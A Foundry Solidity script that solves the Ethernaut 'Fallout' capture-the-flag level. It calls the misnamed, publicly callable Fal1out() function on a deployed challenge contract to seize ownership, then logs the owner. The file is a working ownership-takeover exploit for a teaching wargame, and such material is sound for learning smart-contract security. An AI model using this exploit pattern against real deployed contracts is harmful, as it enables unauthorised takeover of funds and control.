// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "../src/Fallout.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FalloutSolution is Script {

    address payable target = 0x671268889DB29C3c66F0E112f9d271E643a26259;
    Fallout fallout = Fallout(target);

    function run() external {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        fallout.Fal1out();
        console.log("Owner: ", fallout.owner());
        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));

        vm.stopBroadcast();
    }
}
